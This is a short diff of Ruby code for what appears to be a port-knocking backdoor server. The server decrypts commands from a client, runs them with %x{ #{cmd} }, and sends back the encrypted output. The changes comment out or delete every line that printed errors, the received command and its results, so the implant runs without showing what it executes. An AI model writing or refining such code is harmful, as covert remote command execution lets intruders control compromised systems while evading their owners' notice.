@@ -61,7 +61,7 @@ def decrypt(data)
         msg = cipher.update(data)
         msg << cipher.final
     rescue Exception => e
-        puts e
+        #puts e
     end
     return msg
 end
@@ -76,7 +76,7 @@ def encrypt(data)
         payload = cipher.update(data)
         payload << cipher.final
     rescue Exception => e
-        puts e
+        #puts e
     end
     return payload
 end
@@ -92,9 +92,8 @@ def start_server
                 Thread.exit
                 #go back to knock loop
             else
-                puts "hello: command is #{cmd}"
+                #puts "hello: command is #{cmd}"
                 results = %x{ #{cmd} }
-                puts results
                 client.puts encrypt(results)
                 client.flush
             end
